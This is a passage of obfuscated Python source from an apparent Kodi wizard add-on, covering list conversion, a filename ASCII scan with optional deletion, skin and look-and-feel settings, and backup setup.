                O0O0O00OO0O0OOOOO +='version="%s"\n'%O000000O00O00OO00 #line:1705
                O0O0O00OO0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1706
                O0O0O00OO0O0OOOOO +='gui="%s"\n'%O0OO00OO0OO0OO000 #line:1707
                O0O0O00OO0O0OOOOO +='kodi="%s"\n'%O0OOO0OOO00O0O000 #line:1708
                O0O0O00OO0O0OOOOO +='theme="%s"\n'%O0OO0OOO00OOOOOO0 #line:1709
                O0O0O00OO0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1710
                O0O0O00OO0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1711
                O0O0O00OO0O0OOOOO +='preview="http://"\n'#line:1712
                O0O0O00OO0O0OOOOO +='adult="no"\n'#line:1713
                O0O0O00OO0O0OOOOO +='description="Download %s from %s"\n'%(OOOO0OOOO000O000O ,ADDONTITLE )#line:1714
                if not O0OO0OOO00OOOOOO0 =='http://':#line:1715
                    O00OOOOO0OO00OOO0 =os .path .join (OOO00OO000000OOOO ,'%s_theme.txt'%OOOO0OOOO000O000O )#line:1716
                    OO00OOO0O0O0OOOOO ='';OOOO00OO0000OO000 =0 #line:1717
                    O0O0OOOO00O000O0O =openURL (O0OO0OOO00OOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1718
                    DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOOO000O000O ),'','Please Wait')#line:1719
                    OOO0O0OOOOO000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1720
                    for OOOO0OOOO000O000O ,O0OOOOO00OOOO0O0O ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 ,OO0OOOO000O0OOO0O in OOO0O0OOOOO000OOO :#line:1721
                        OOOO00OO0000OO000 +=1 #line:1722
                        DP .update (int (percentage (OOOO00OO0000OO000 ,len (O0O0000000000O0OO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1723
                        if not OO00OOO0O0O0OOOOO =='':OO00OOO0O0O0OOOOO +='\n'#line:1724
                        OO00OOO0O0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1725
                        OO00OOO0O0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1726
                        OO00OOO0O0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1727
                        OO00OOO0O0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1728
                        OO00OOO0O0O0OOOOO +='adult="no"\n'#line:1729
                        OO00OOO0O0O0OOOOO +='description="%s"\n'%OO0OOOO000O0OOO0O #line:1730
                    OO00OOO0O00O00000 =open (O00OOOOO0OO00OOO0 ,'w');OO00OOO0O00O00000 .write (OO00OOO0O0O0OOOOO );OO00OOO0O00O00000 .close ()#line:1731
        else :#line:1732
            for OOOO0OOOO000O000O ,O000000O00O00OO00 ,O0OOOOO00OOOO0O0O ,O0OO00OO0OO0OO000 ,O0OOO0OOO00O0O000 ,O0OO0OOO00OOOOOO0 ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 ,OOOOOOO0OOOOO0OOO ,OO0OOOO000O0OOO0O in O0O0000000000O0OO :#line:1733
                O0OOOOO0000O000OO +=1 #line:1734
                DP .update (int (percentage (O0OOOOO0000O000OO ,len (O0O0000000000O0OO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1735
                if not O0O0O00OO0O0OOOOO =='':O0O0O00OO0O0OOOOO +='\n'#line:1736
                O0O0O00OO0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1737
                O0O0O00OO0O0OOOOO +='version="%s"\n'%O000000O00O00OO00 #line:1738
                O0O0O00OO0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1739
                O0O0O00OO0O0OOOOO +='gui="%s"\n'%O0OO00OO0OO0OO000 #line:1740
                O0O0O00OO0O0OOOOO +='kodi="%s"\n'%O0OOO0OOO00O0O000 #line:1741
                O0O0O00OO0O0OOOOO +='theme="%s"\n'%O0OO0OOO00OOOOOO0 #line:1742
                O0O0O00OO0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1743
                O0O0O00OO0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1744
                O0O0O00OO0O0OOOOO +='preview="http://"\n'#line:1745
                O0O0O00OO0O0OOOOO +='adult="%s"\n'%OOOOOOO0OOOOO0OOO #line:1746
                O0O0O00OO0O0OOOOO +='description="%s"\n'%OO0OOOO000O0OOO0O #line:1747
                if not O0OO0OOO00OOOOOO0 =='http://':#line:1748
                    O00OOOOO0OO00OOO0 =os .path .join (OOO00OO000000OOOO ,'%s_theme.txt'%OOOO0OOOO000O000O )#line:1749
                    OO00OOO0O0O0OOOOO ='';OOOO00OO0000OO000 =0 #line:1750
                    O0O0OOOO00O000O0O =openURL (O0OO0OOO00OOOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1751
                    DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]%s_theme.txt[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOOO000O000O ),'','Please Wait')#line:1752
                    OOO0O0OOOOO000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1753
                    for OOOO0OOOO000O000O ,O0OOOOO00OOOO0O0O ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 ,OO0OOOO000O0OOO0O in OOO0O0OOOOO000OOO :#line:1754
                        OOOO00OO0000OO000 +=1 #line:1755
                        DP .update (int (percentage (OOOO00OO0000OO000 ,len (O0O0000000000O0OO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1756
                        if not OO00OOO0O0O0OOOOO =='':OO00OOO0O0O0OOOOO +='\n'#line:1757
                        OO00OOO0O0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1758
                        OO00OOO0O0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1759
                        OO00OOO0O0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1760
                        OO00OOO0O0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1761
                        OO00OOO0O0O0OOOOO +='adult="no"\n'#line:1762
                        OO00OOO0O0O0OOOOO +='description="%s"\n'%OO0OOOO000O0OOO0O #line:1763
                    OO00OOO0O00O00000 =open (O00OOOOO0OO00OOO0 ,'w');OO00OOO0O00O00000 .write (OO00OOO0O0O0OOOOO );OO00OOO0O00O00000 .close ()#line:1764
        OO00OOO0O00O00000 =open (O000O0OO0000O00OO ,'w');OO00OOO0O00O00000 .write (O0O0O00OO0O0OOOOO );OO00OOO0O00O00000 .close ()#line:1765
    if not APKFILE =='http://':#line:1767
        O000O0OO0000O00OO =os .path .join (OOO00OO000000OOOO ,'apks.txt')#line:1768
        O0O0O00OO0O0OOOOO ='';O0OOOOO0000O000OO =0 #line:1769
        O0O0OOOO00O000O0O =openURL (APKFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1770
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]Apks.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1771
        O000O0OO0OO000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1772
        O0O0000000000O0OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1773
        if len (O0O0000000000O0OO )==0 :#line:1774
            for OOOO0OOOO000O000O ,O0OOOOO00OOOO0O0O ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 in O000O0OO0OO000OOO :#line:1775
                O0OOOOO0000O000OO +=1 #line:1776
                DP .update (int (percentage (O0OOOOO0000O000OO ,len (O000O0OO0OO000OOO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1777
                if not O0O0O00OO0O0OOOOO =='':O0O0O00OO0O0OOOOO +='\n'#line:1778
                O0O0O00OO0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1779
                O0O0O00OO0O0OOOOO +='section="no"'#line:1780
                O0O0O00OO0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1781
                O0O0O00OO0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1782
                O0O0O00OO0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1783
                O0O0O00OO0O0OOOOO +='adult="no"\n'#line:1784
                O0O0O00OO0O0OOOOO +='description="Download %s from %s"\n'%(OOOO0OOOO000O000O ,ADDONTITLE )#line:1785
        else :#line:1786
            for OOOO0OOOO000O000O ,O0OOOOO00OOOO0O0O ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 ,OOOOOOO0OOOOO0OOO ,OO0OOOO000O0OOO0O in O0O0000000000O0OO :#line:1787
                O0OOOOO0000O000OO +=1 #line:1788
                DP .update (int (percentage (O0OOOOO0000O000OO ,len (O0O0000000000O0OO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1789
                if not O0O0O00OO0O0OOOOO =='':O0O0O00OO0O0OOOOO +='\n'#line:1790
                O0O0O00OO0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1791
                O0O0O00OO0O0OOOOO +='section="no"'#line:1792
                O0O0O00OO0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1793
                O0O0O00OO0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1794
                O0O0O00OO0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1795
                O0O0O00OO0O0OOOOO +='adult="%s"\n'%OOOOOOO0OOOOO0OOO #line:1796
                O0O0O00OO0O0OOOOO +='description="%s"\n'%OO0OOOO000O0OOO0O #line:1797
        OO00OOO0O00O00000 =open (O000O0OO0000O00OO ,'w');OO00OOO0O00O00000 .write (O0O0O00OO0O0OOOOO );OO00OOO0O00O00000 .close ()#line:1798
    if not YOUTUBEFILE =='http://':#line:1800
        O000O0OO0000O00OO =os .path .join (OOO00OO000000OOOO ,'youtube.txt')#line:1801
        O0O0O00OO0O0OOOOO ='';O0OOOOO0000O000OO =0 #line:1802
        O0O0OOOO00O000O0O =openURL (YOUTUBEFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1803
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]YouTube.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1804
        O000O0OO0OO000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1805
        for OOOO0OOOO000O000O ,O0OOOOO00OOOO0O0O ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 ,OO0OOOO000O0OOO0O in O000O0OO0OO000OOO :#line:1806
            O0OOOOO0000O000OO +=1 #line:1807
            DP .update (int (percentage (O0OOOOO0000O000OO ,len (O000O0OO0OO000OOO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1808
            if not O0O0O00OO0O0OOOOO =='':O0O0O00OO0O0OOOOO +='\n'#line:1809
            O0O0O00OO0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1810
            O0O0O00OO0O0OOOOO +='section="no"'#line:1811
            O0O0O00OO0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1812
            O0O0O00OO0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1813
            O0O0O00OO0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1814
            O0O0O00OO0O0OOOOO +='description="%s"\n'%OO0OOOO000O0OOO0O #line:1815
        OO00OOO0O00O00000 =open (O000O0OO0000O00OO ,'w');OO00OOO0O00O00000 .write (O0O0O00OO0O0OOOOO );OO00OOO0O00O00000 .close ()#line:1816
    if not ADVANCEDFILE =='http://':#line:1818
        O000O0OO0000O00OO =os .path .join (OOO00OO000000OOOO ,'advancedsettings.txt')#line:1819
        O0O0O00OO0O0OOOOO ='';O0OOOOO0000O000OO =0 #line:1820
        O0O0OOOO00O000O0O =openURL (ADVANCEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:1821
        DP .update (0 ,'[COLOR %s][B]Converting Text:[/B][/COLOR] [COLOR %s]AdvancedSettings.txt[/COLOR]'%(COLOR2 ,COLOR1 ),'','Please Wait')#line:1822
        O000O0OO0OO000OOO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOOO00O000O0O )#line:1823
        for OOOO0OOOO000O000O ,O0OOOOO00OOOO0O0O ,OO000O0O0O0O00OOO ,O00O000OO0O0000O0 ,OO0OOOO000O0OOO0O in O000O0OO0OO000OOO :#line:1824
            O0OOOOO0000O000OO +=1 #line:1825
            DP .update (int (percentage (O0OOOOO0000O000OO ,len (O000O0OO0OO000OOO ))),'',"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOOO000O000O ))#line:1826
            if not O0O0O00OO0O0OOOOO =='':O0O0O00OO0O0OOOOO +='\n'#line:1827
            O0O0O00OO0O0OOOOO +='name="%s"\n'%OOOO0OOOO000O000O #line:1828
            O0O0O00OO0O0OOOOO +='section="no"'#line:1829
            O0O0O00OO0O0OOOOO +='url="%s"\n'%O0OOOOO00OOOO0O0O #line:1830
            O0O0O00OO0O0OOOOO +='icon="%s"\n'%OO000O0O0O0O00OOO #line:1831
            O0O0O00OO0O0OOOOO +='fanart="%s"\n'%O00O000OO0O0000O0 #line:1832
            O0O0O00OO0O0OOOOO +='description="%s"\n'%OO0OOOO000O0OOO0O #line:1833
        OO00OOO0O00O00000 =open (O000O0OO0000O00OO ,'w');OO00OOO0O00O00000 .write (O0O0O00OO0O0OOOOO );OO00OOO0O00O00000 .close ()#line:1834
    DP .close ()#line:1836
    DIALOG .ok (ADDONTITLE ,'[COLOR %s]Your text files have been converted to 0.1.7 and are location in the [COLOR %s]/addon_data/%s/[/COLOR] folder[/COLOR]'%(COLOR2 ,COLOR1 ,ADDON_ID ))#line:1837
def reloadProfile (profile =None ):#line:1839
    if profile ==None :#line:1840
        ebi ('LoadProfile(Master user)')#line:1847
    else :ebi ('LoadProfile(%s)'%profile )#line:1848
def chunks (OO0OO0O00O0O00000 ,OO0O0OOOOOOO00000 ):#line:1850
    for OOO000O0OO00OO0O0 in range (0 ,len (OO0OO0O00O0O00000 ),OO0O0OOOOOOO00000 ):#line:1851
        yield OO0OO0O00O0O00000 [OOO000O0OO00OO0O0 :OOO000O0OO00OO0O0 +OO0O0OOOOOOO00000 ]#line:1852
def asciiCheck (use =None ,over =False ):#line:1854
    if use ==None :#line:1855
        OOO0OOO0O00000O0O =DIALOG .browse (3 ,'[COLOR %s]Select the folder you want to scan[/COLOR]'%COLOR2 ,'files','',False ,False ,HOME )#line:1856
        if over ==True :#line:1857
            OO00O0O00OO0OO000 =1 #line:1858
        else :#line:1859
            OO00O0O00OO0OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Do you want to [COLOR %s]delete[/COLOR] all filenames with special characters or would you rather just [COLOR %s]scan and view[/COLOR] the results in the log?[/COLOR]'%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ='[B][COLOR green]Delete[/COLOR][/B]',nolabel ='[B][COLOR red]Scan[/COLOR][/B]')#line:1860
    else :#line:1861
        OOO0OOO0O00000O0O =use #line:1862
        OO00O0O00OO0OO000 =1 #line:1863
    if OOO0OOO0O00000O0O =="":#line:1865
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: Cancelled[/COLOR]"%COLOR2 )#line:1866
        return #line:1867
    OOO000O0O0O0O0O00 =os .path .join (ADDONDATA ,'asciifiles.txt')#line:1869
    O0OOOO000OOO00000 =os .path .join (ADDONDATA ,'asciifails.txt')#line:1870
    O00OO00000O0OOOO0 =open (OOO000O0O0O0O0O00 ,mode ='w+')#line:1871
    O000OO0O0OO00O000 =open (O0OOOO000OOO00000 ,mode ='w+')#line:1872
    OOO0OOO0O0O00O00O =0 ;O00O0O0OO00O000OO =0 #line:1873
    OO0O0000000O0OO00 =fileCount (OOO0OOO0O00000O0O )#line:1874
    OO0000O0O00OOOOOO =''#line:1875
    OO000OOO00000OOOO =[]#line:1876
    log ("Source file: (%s)"%str (OOO0OOO0O00000O0O ),5 )#line:1877
    DP .create (ADDONTITLE ,'Please wait...')#line:1879
    for O00000O0O00000O00 ,O0OOO0OO0O0OO0O00 ,OO0OO0O000OOOOO00 in os .walk (OOO0OOO0O00000O0O ):#line:1880
        O0OOO0OO0O0OO0O00 [:]=[O00OO0O0O0OOOOOO0 for O00OO0O0O0OOOOOO0 in O0OOO0OO0O0OO0O00 ]#line:1881
        OO0OO0O000OOOOO00 [:]=[O00000OOOO0000OOO for O00000OOOO0000OOO in OO0OO0O000OOOOO00 ]#line:1882
        for O0O0O00OOOO0O000O in OO0OO0O000OOOOO00 :#line:1883
            OO000OOO00000OOOO .append (O0O0O00OOOO0O000O )#line:1884
            O0OOO00O0OO000OO0 =int (len (OO000OOO00000OOOO )/float (OO0O0000000O0OO00 )*100 )#line:1885
            DP .update (O0OOO00O0OO000OO0 ,"[COLOR %s]Checking for non ASCII files"%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,d ),'Please Wait[/COLOR]')#line:1886
            try :#line:1887
                O0O0O00OOOO0O000O .encode ('ascii')#line:1888
            except UnicodeDecodeError :#line:1889
                O0000000000OO0O00 =os .path .join (O00000O0O00000O00 ,O0O0O00OOOO0O000O )#line:1890
                if OO00O0O00OO0OO000 :#line:1891
                    try :#line:1892
                        os .remove (O0000000000OO0O00 )#line:1893
                        for OOO0OOOO00O00O0O0 in chunks (O0000000000OO0O00 ,75 ):#line:1894
                            O00OO00000O0OOOO0 .write (OOO0OOOO00O00O0O0 +'\n')#line:1895
                        O00OO00000O0OOOO0 .write ('\n')#line:1896
                        OOO0OOO0O0O00O00O +=1 #line:1897
                        log ("[ASCII Check] File Removed: %s "%O0000000000OO0O00 ,5 )#line:1898
                    except :#line:1899
                        for OOO0OOOO00O00O0O0 in chunks (O0000000000OO0O00 ,75 ):#line:1900
                            O000OO0O0OO00O000 .write (OOO0OOOO00O00O0O0 +'\n')#line:1901
                        O000OO0O0OO00O000 .write ('\n')#line:1902
                        O00O0O0OO00O000OO +=1 #line:1903
                        log ("[ASCII Check] File Failed: %s "%O0000000000OO0O00 ,5 )#line:1904
                else :#line:1905
                    for OOO0OOOO00O00O0O0 in chunks (O0000000000OO0O00 ,75 ):#line:1906
                        O00OO00000O0OOOO0 .write (OOO0OOOO00O00O0O0 +'\n')#line:1907
                    O00OO00000O0OOOO0 .write ('\n')#line:1908
                    OOO0OOO0O0O00O00O +=1 #line:1909
                    log ("[ASCII Check] File Found: %s "%O0000000000OO0O00 ,5 )#line:1910
                pass #line:1911
    DP .close ();O00OO00000O0OOOO0 .close ();O000OO0O0OO00O000 .close ()#line:1912
    OOO0O0O00OO0O00OO =int (OOO0OOO0O0O00O00O )+int (O00O0O0OO00O000OO )#line:1913
    if OOO0O0O00OO0O00OO >0 :#line:1914
        if os .path .exists (OOO000O0O0O0O0O00 ):O00OO00000O0OOOO0 =open (OOO000O0O0O0O0O00 ,mode ='r');OO0000O0O00OOOOOO =O00OO00000O0OOOO0 .read ();O00OO00000O0OOOO0 .close ()#line:1915
        if os .path .exists (O0OOOO000OOO00000 ):O000OO0O0OO00O000 =open (O0OOOO000OOO00000 ,mode ='r');O00O0OO0O000OOO0O =O000OO0O0OO00O000 .read ();O000OO0O0OO00O000 .close ()#line:1916
        if OO00O0O00OO0OO000 :#line:1917
            if use :#line:1918
                LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: %s Removed / %s Failed.[/COLOR]"%(COLOR2 ,OOO0OOO0O0O00O00O ,O00O0O0OO00O000OO ))#line:1919
            else :#line:1920
                TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Removed:[/B][/COLOR]\n %s\n\n[COLOR yellow][B]%s Files Failed:[B][/COLOR]\n %s"%(OOO0OOO0O0O00O00O ,OO0000O0O00OOOOOO ,O00O0O0OO00O000OO ,O00O0OO0O000OOO0O ))#line:1921
        else :#line:1922
            TextBox (ADDONTITLE ,"[COLOR yellow][B]%s Files Found:[/B][/COLOR]\n %s"%(OOO0OOO0O0O00O00O ,OO0000O0O00OOOOOO ))#line:1923
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]ASCII Check: None Found.[/COLOR]"%COLOR2 )#line:1924
def fileCount (OOO0OOO0OOOO0000O ,excludes =True ):#line:1926
    O000OO0OO0OO0OOO0 =[ADDON_ID ,'cache','system','packages','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:1927
    O0000OO0000OO0OOO =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:1928
    OOOOOOO0OOOOO000O =[]#line:1929
    for O0000OO000000000O ,O00000O0OO000O0OO ,O000O0O0OO0OO0O00 in os .walk (OOO0OOO0OOOO0000O ):#line:1930
        if excludes :#line:1931
            O00000O0OO000O0OO [:]=[OO00O00OOOO00OOO0 for OO00O00OOOO00OOO0 in O00000O0OO000O0OO if OO00O00OOOO00OOO0 not in O000OO0OO0OO0OOO0 ]#line:1932
            O000O0O0OO0OO0O00 [:]=[O0OOOOOOOO00OO0O0 for O0OOOOOOOO00OO0O0 in O000O0O0OO0OO0O00 if O0OOOOOOOO00OO0O0 not in O0000OO0000OO0OOO ]#line:1933
        for O0O0000OO00O00000 in O000O0O0OO0OO0O00 :#line:1934
            OOOOOOO0OOOOO000O .append (O0O0000OO00O00000 )#line:1935
    return len (OOOOOOO0OOOOO000O )#line:1936
def defaultSkin ():#line:1938
    log ("[Default Skin Check]",5 )#line:1939
    O0O0O0OOOOO0000OO =os .path .join (USERDATA ,'guitemp.xml')#line:1940
    OO0O0OO00O000O000 =O0O0O0OOOOO0000OO if os .path .exists (O0O0O0OOOOO0000OO )else GUISETTINGS #line:1941
    if not os .path .exists (OO0O0OO00O000O000 ):return False #line:1942
    log ("Reading gui file: %s"%OO0O0OO00O000O000 ,5 )#line:1943
    OO0O00O0000O0OO0O =open (OO0O0OO00O000O000 ,'r+')#line:1944
    O0O00000OOO0OOOOO =OO0O00O0000O0OO0O .read ().replace ('\n','').replace ('\r','').replace ('\t','').replace ('    ','');OO0O00O0000O0OO0O .close ()#line:1945
    log ("Opening gui settings",5 )#line:1946
    OO0OOOO000O0000OO =re .compile ('<lookandfeel>.+?<ski.+?>(.+?)</skin>.+?</lookandfeel>').findall (O0O00000OOO0OOOOO )#line:1947
    log ("Matches: %s"%str (OO0OOOO000O0000OO ),5 )#line:1948
    if len (OO0OOOO000O0000OO )>0 :#line:1949
        O0O0OOO0OO0O00000 =OO0OOOO000O0000OO [0 ]#line:1950
        O0OO000000O00O00O =os .path .join (ADDONS ,OO0OOOO000O0000OO [0 ],'addon.xml')#line:1951
        if os .path .exists (O0OO000000O00O00O ):#line:1952
            O0000OO0OO000OOOO =open (O0OO000000O00O00O ,'r+')#line:1953
            O00000OOO0O0O000O =O0000OO0OO000OOOO .read ();O0000OO0OO000OOOO .close ()#line:1954
            O0OOO00OO00O0OO00 =parseDOM (O00000OOO0O0O000O ,'addon',ret ='name')#line:1955
            if len (O0OOO00OO00O0OO00 )>0 :O0O0OO00000OOO0OO =O0OOO00OO00O0OO00 [0 ]#line:1956
            else :O0O0OO00000OOO0OO ='no match'#line:1957
        else :O0O0OO00000OOO0OO ='no file'#line:1958
        log ("[Default Skin Check] Skin name: %s"%O0O0OO00000OOO0OO ,5 )#line:1959
        log ("[Default Skin Check] Skin id: %s"%O0O0OOO0OO0O00000 ,5 )#line:1960
        setS ('defaultskin',O0O0OOO0OO0O00000 )#line:1961
        setS ('defaultskinname',O0O0OO00000OOO0OO )#line:1962
        setS ('defaultskinignore','false')#line:1963
    if os .path .exists (O0O0O0OOOOO0000OO ):#line:1964
        log ("Deleting Temp Gui File.",5 )#line:1965
        os .remove (O0O0O0OOOOO0000OO )#line:1966
    log ("[Default Skin Check] End",5 )#line:1967
def lookandFeelData (do ='save'):#line:1969
    OO000OOO0OOO00OOO =['lookandfeel.enablerssfeeds','lookandfeel.font','lookandfeel.rssedit','lookandfeel.skincolors','lookandfeel.skintheme','lookandfeel.skinzoom','lookandfeel.soundskin','lookandfeel.startupwindow','lookandfeel.stereostrength']#line:1970
    if do =='save':#line:1971
        for O000000OO00OO0O0O in OO000OOO0OOO00OOO :#line:1972
            OOO0O0000OO00O0O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":"%s"}, "id":1}'%(O000000OO00OO0O0O )#line:1973
            O00OOO0000OOOO0O0 =xbmc .executeJSONRPC (OOO0O0000OO00O0O0 )#line:1974
            if not 'error'in O00OOO0000OOOO0O0 :#line:1975
                O0O00OOO000OO0000 =re .compile ('{"value":(.+?)}').findall (str (O00OOO0000OOOO0O0 ))#line:1976
                setS (O000000OO00OO0O0O .replace ('lookandfeel','default'),O0O00OOO000OO0000 [0 ])#line:1977
                log ("%s saved to %s"%(O000000OO00OO0O0O ,O0O00OOO000OO0000 [0 ]),5 )#line:1978
    else :#line:1979
        for O000000OO00OO0O0O in OO000OOO0OOO00OOO :#line:1980
            O0000OOO0OO0OO000 =getS (O000000OO00OO0O0O .replace ('lookandfeel','default'))#line:1981
            OOO0O0000OO00O0O0 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":"%s","value":%s}, "id":1}'%(O000000OO00OO0O0O ,O0000OOO0OO0OO000 )#line:1982
            O00OOO0000OOOO0O0 =xbmc .executeJSONRPC (OOO0O0000OO00O0O0 )#line:1983
            log ("%s restored to %s"%(O000000OO00OO0O0O ,O0000OOO0OO0OO000 ),5 )#line:1984
def sep (middle =''):#line:1986
    OOOO0OO0O0O00OO00 =uservar .SPACER #line:1987
    O0O00OO0O000O00O0 =OOOO0OO0O0O00OO00 *40 #line:1988
    if not middle =='':#line:1989
        middle ='[ %s ]'%middle #line:1990
        OOO000O0O0OOO000O =int ((40 -len (middle ))/2 )#line:1991
        O0O00OO0O000O00O0 ="%s%s%s"%(O0O00OO0O000O00O0 [:OOO000O0O0OOO000O ],middle ,O0O00OO0O000O00O0 [:OOO000O0O0OOO000O +2 ])#line:1992
    return O0O00OO0O000O00O0 [:40 ]#line:1993
def convertAdvanced ():#line:1995
    if os .path .exists (ADVANCED ):#line:1996
        O0OO0O00000O00OO0 =open (ADVANCED )#line:1997
        OOO00OO00OOOO0O00 =O0OO0O00000O00OO0 .read ()#line:1998
        if KODIV >=17 :#line:1999
            return #line:2000
        else :#line:2001
            return #line:2002
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2003
def backUpOptions (O00OO0OOO00OO00OO ,name =""):#line:2008
    O0OO00000O000O00O =[ADDON_ID ,'cache','system','Thumbnails','peripheral_data','temp','My_Builds','library','keymaps']#line:2009
    OO00000000OOO0OOO =['Textures13.db','.DS_Store','advancedsettings.xml','Thumbs.db','.gitignore']#line:2010
    O00000000OOO000O0 =[os .path .join (DATABASE ,'onechannelcache.db'),os .path .join (DATABASE ,'saltscache.db'),os .path .join (DATABASE ,'saltscache.db-shm'),os .path .join (DATABASE ,'saltscache.db-wal'),os .path .join (DATABASE ,'saltshd.lite.db'),os .path .join (DATABASE ,'saltshd.lite.db-shm'),os .path .join (DATABASE ,'saltshd.lite.db-wal'),os .path .join (ADDOND ,'script.trakt','queue.db'),os .path .join (HOME ,'cache','commoncache.db'),os .path .join (ADDOND ,'script.module.dudehere.routines','access.log'),os .path .join (ADDOND ,'script.module.dudehere.routines','trakt.db'),os .path .join (ADDOND ,'script.module.metahandler','meta_cache','video_cache.db')]#line:2022
    OO0O0O0O00O0000OO =translatepath (BACKUPLOCATION )#line:2024
    OOOOO00000OO0OOOO =translatepath (MYBUILDS )#line:2025
    try :#line:2026
        if not os .path .exists (OO0O0O0O00O0000OO ):xbmcvfs .mkdirs (OO0O0O0O00O0000OO )#line:2027
        if not os .path .exists (OOOOO00000OO0OOOO ):xbmcvfs .mkdirs (OOOOO00000OO0OOOO )#line:2028
    except Exception as OO000O00OO0OOO000 :#line:2029
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (OO000O00OO0OOO000 )))#line:2030
        return #line:2031
    if O00OO0OOO00OO00OO =="build":#line:2032
